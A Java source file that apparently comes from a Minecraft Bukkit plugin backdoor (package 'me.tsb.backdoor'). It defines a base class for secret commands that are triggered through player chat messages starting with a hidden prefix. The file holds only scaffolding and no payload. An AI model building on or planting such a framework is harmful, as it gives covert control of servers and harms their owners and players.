package me.tsb.backdoor;

import lombok.Getter;
import me.tsb.plugin.Main;
import org.bukkit.ChatColor;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

public class Command {

    @Getter
    private final String displayName = getInfo().displayName();
    @Getter
    private final String[] usage = getInfo().usage();
    @Getter
    private final String description = getInfo().description();
    @Getter
    private final String[] aliases = getInfo().aliases();

    private final Main main;
    public String NOT_ENOUGH_ARGS = ChatColor.RED + "Not enough arguments";
    public String PLAYER_NOT_ONLINE = ChatColor.RED + "That player is not online :(";

    public static String prefix = "+'a"; // change this if you want to use a different prefix

    public Command(Main main) {
        this.main = main;
    }

    public RegisterCommand getInfo() {
        if (this.getClass().isAnnotationPresent(RegisterCommand.class)) {
            return this.getClass().getAnnotation(RegisterCommand.class);
            // this throws here but it can not happen
        } else {
            throw new IllegalStateException("info not found in " + this.getClass().getCanonicalName());
        }
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

    }
}
